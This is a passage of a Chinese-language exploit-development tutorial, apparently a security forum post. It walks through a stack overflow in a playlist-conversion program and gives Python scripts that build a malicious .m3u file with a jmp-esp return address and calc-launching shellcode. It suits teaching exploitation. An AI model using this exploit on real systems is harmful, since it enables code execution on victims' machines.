
![栈回溯情况2](https://bbs.kanxue.com/upload/attach/202204/930159_4VPVYME5WZWHPBT.png)

2.在找到的这个函数地址下断

![定位处理函数](https://bbs.kanxue.com/upload/attach/202204/930159_SRQV4BMWTUBGCKZ.png)

3.重新调试，打开测试文件后断下，果然这个函数是用来处理文件的，具体做了些什么不清楚，但根据程序名，推测这是处理格式转换的

4.经过一路跟踪，发现了它调用`fopne`函数打开文件，按照编程惯例，之后马上会有`fwrite`调用来把文件内容写入缓冲区

![溢出函数](https://bbs.kanxue.com/upload/attach/202204/930159_FBN7NNPW66SQ9QB.png)

5.继续跟踪，看到在一系列操作过后，来到了溢出位置（快速浏览汇编代码，找到对栈进行操作的位置）

![定位关键栈操作](https://bbs.kanxue.com/upload/attach/202204/930159_CYG6PTB6EEEM7BN.png)

6.可以看到在这里，在进行了大小计算后，对栈进行了赋值操作，本来想通过栈缓冲区大小来精准定位返回地址，但是经过计算，发现对文件进行操作的时候，文件的大小改变了，并且文件内容也有一些改变，应该是转换过程中的操作，所以没办法根据栈缓冲区大小来定位返回地址了。

7.分析到这里，漏洞成因也可以确定了，这个程序把数据读入缓冲区，经过一系列的处理后，写到了栈中，且没有比较大小，以数据大小来进行赋值，所以造成了栈溢出

# 漏洞利用

1.漏洞利用精确覆盖返回地址

通过计算栈大小失败后，可以使用`msf`的`pattern_create.rb`与`pattern_offset`来进行定位，`cd`到`msf`的工具目录，使用脚本（我使用`kali`来生成 `windows`也可以 但不推荐 环境配置会有很多坑）

```
./pattern_create.rb -l 5000 > /home/kali/Desktop/test.txt
```

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

char = "\x41" * 25000

Fileptr = open(r'crash.m3u','w')
testfile = open(r'test.txt','r')

teststr = testfile.read()
Fileptr.write(char)
Fileptr.close()
testfile.close()

print("CreatFile Success")
```

2.使用上述两个脚本后，生成测试文件，再次调试，进行返回地址精确定位

```
(e94.8bc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=00007530
eip=366a4235 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
366a4235 ??              ???
```

```
./pattern_offset.rb -q 366a4235 -l 5000
[*] Exact match at offset 1067
```

这两个脚本的简单原理就是（可以`-h`查看帮助），通过它生成的畸形数据（每次生成都一样）来覆盖返回地址，然后覆盖返回地址以后，通过那个值来计算在测试数据中的偏移，以此来确定返回位置，进行精准打击

3.脚本返回的偏移为 1067 ，加上25000个A ，也就是文件里 26067的位置 ， 继续写脚本进行测试 （偏移地址因环境而已）

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

char = "\x41" * 26067
retaddr = "BBBB"
char2 = 'C' * 1000

Fileptr = open(r'crash.m3u','w')
Fileptr.write(char + retaddr + char2)
Fileptr.close()

print("CreatFile Success")
```

4.好的，返回地址被覆盖为`BBBB`也就是`42424242`

```
(a30.f1c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=000069bf
eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
42424242 ??              ???
0:000> dd esp
000ffd38  43434343 43434343 43434343 43434343
000ffd48  43434343 43434343 43434343 43434343
000ffd58  43434343 43434343 43434343 43434343
```

5.找到了返回地址的位置，那么要进行漏洞利用，还需要把`shellcode`放入程序中，并且需要让返回地址为`shellcode`地址或者`nop`区

众所周知，返回指令，可以附带操作数，也就是返回时弹出几个字节，所以我们需要确定到底返回了几个字节，根据之前的漏洞分析环节，找到漏洞位置后，直接F9，可以到返回指令 `retn 4`

另一个办法，修改`char2`部分的数据，修改后生成测试文件进行测试，查看`esp`，会得到同样的结论

6.`shellcode`一般不可以包含 `0x00` ，会被截断

7.现在已经知道了返回会弹出4个字节，所以`py`脚本这样写，`shellcode`为`xp sp3`弹出计算器的代码（比较简单，自己用汇编写了，如果想研究一下`shellcode`，可以把`shellcode`拷贝到调试器中，调整`EIP`直接运行即可看到代码）

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

char = "\x41" * 26067
retaddr = "BBBB"
perfix = "CCCC"
shellcode = "\x90" * 20
shellcode += \
"\x55\x8B\xEC\x33" \
"\xC0\x50\xB8\x2E" \
"\x65\x78\x65\x50" \
"\xB8\x63\x61\x6C" \
"\x63\x50\x8B\xC4" \
"\x6A\x05\x50\xB8" \
"\xAD\x23\x86\x7C" \
"\xFF\xD0\x33\xC0" \
"\x50\xB8\xFA\xCA" \
"\x81\x7C\xFF\xD0" \
"\x8B\xE5\x5D\x33"

Fileptr = open(r'crash.m3u','w')
Fileptr.write(char + retaddr + perfix + shellcode)
Fileptr.close()

print("CreatFile Success")
```

8.那么现在需要确定返回地址了，返回地址覆盖时，同样不可以包含`NULL`字符，另外由于栈地址有一定的随机性，所以使用跳板指令`jmp esp`来达到我们的目的

9.搜索跳板地址的话，`MSF`有个小工具可以使用，`msfpescan`（这里不使用了）

根据教程，使用`windbg`命令`lmi` （也可以使用`OD`的插件 `OllyFindAddr`）

![模块](https://bbs.kanxue.com/upload/attach/202204/930159_NBSRYMBDCXJG68V.png)

然后使用搜索内存指令，我搜索的是`kernel32` `FF E4`为`JMP ESP`指令机器码 ， 可以在调试器中修改汇编指令查看

```
0:010> s 7c800000 7c91e000 FF E4
7c86467b  ff e4 47 86 7c ff 15 58-15 80 7c 8d 85 38 fe ff  ..G.|..X..|..8..
```

10.在`py`脚本中， `retaddr`换成 `"\x7b\x46\x86\x7c"` 小端序 ， 如果你的一些字符在`py`中出现编码问题，在字符串前加`b`，并且文件以`wb`模式写入

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

char = b"\x41" * 26067
retaddr = b"\x7b\x46\x86\x7c"
perfix = b"CCCC"
shellcode = b"\x90" * 20
shellcode += \
b"\x55\x8B\xEC\x33" \
b"\xC0\x50\xB8\x2E" \
b"\x65\x78\x65\x50" \
b"\xB8\x63\x61\x6C" \
b"\x63\x50\x8B\xC4" \
b"\x6A\x05\x50\xB8" \
b"\xAD\x23\x86\x7C" \
b"\xFF\xD0\x33\xC0" \
b"\x50\xB8\xFA\xCA" \
b"\x81\x7C\xFF\xD0" \
b"\x8B\xE5\x5D\x33"

Fileptr = open(r'EXP.m3u','wb+')
Fileptr.write(char + retaddr + perfix + shellcode)
Fileptr.close()

print("CreatFile Success")
```

11.生成`EXP`文件，进行测试，由于我的`shellcode`中，最后使用了`ExitProcess` 所以没有弹出崩溃窗口（如果读者对跳板指令不熟悉，可以跟踪调试一下，就会理解其中原理）

![exp执行](https://bbs.kanxue.com/upload/attach/202204/930159_42BET6KZ3RVDXAF.png)

12.如果想使用别的`shellcode`（例如反弹`shell`），可以自己编写，或者使用`msf`的`shellcode`模块，生成时可以选择`shellcode`功能与编码方式（由于利用较为简单，不使用了，后续使用会说明用法）

# 总结

1.使用样本测试到漏洞分析

2.漏洞分析找到漏洞成因

3.熟悉`python`编程并写出`EXP`代码

4.一些小技巧，例如`windbg`指令，分析技巧，需要读者自己去总结了

5.由于这个软件没有任何安全机制，所以不展开讨论，后续章节再详细解析

# 参考资料

看雪 `EXP`编写系列教程 第一章

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-5-3 16:33

被yumoqaq编辑

，原因：

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
